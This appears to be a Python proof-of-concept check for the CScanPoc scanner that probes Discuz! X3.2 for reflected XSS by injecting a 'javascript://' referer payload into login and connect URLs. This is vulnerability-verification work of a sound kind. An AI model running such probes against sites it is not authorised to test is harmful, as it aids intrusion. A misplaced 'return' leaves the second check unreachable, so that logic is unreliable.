# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Discuz_0006'  # 平台漏洞编号，留空
    name = 'Discuz! X3.2 多处反射型XSS'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2015-06-04'  # 漏洞公布时间
    desc = '''
        Discuz! X3.2 多处反射型XSS漏洞。
        /member.php?mod=logging&action=login&referer=
        /connect.php?receive=yes&mod=login&op=callback&referer=
    '''  # 漏洞描述
    ref = 'https://www.secpulse.com/archives/32974.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = 'X3.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6e720465-aed5-4b78-95dd-aca764ad4621'
    author = '国光'  # POC编写者
    create_date = '2018-05-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload0 = "/member.php?mod=logging&action=login&referer=javascript://www.discuz.net/testvul"
            payload1 = "/connect.php?receive=yes&mod=login&op=callback&referer=javascript://www.discuz.net/testvul"
            verify_url = '{target}'.format(target=self.target)+payload0
            code, head, res, errcode, _ = hh.http(verify_url)

            if code == 200 and "javascript://www.discuz.net/testvul" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
            return

            verify_url = '{target}'.format(target=self.target)+payload1
            code, head, res, errcode, _ = hh.http(verify_url)
            if code == 200 and "javascript://www.discuz.net/testvul" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
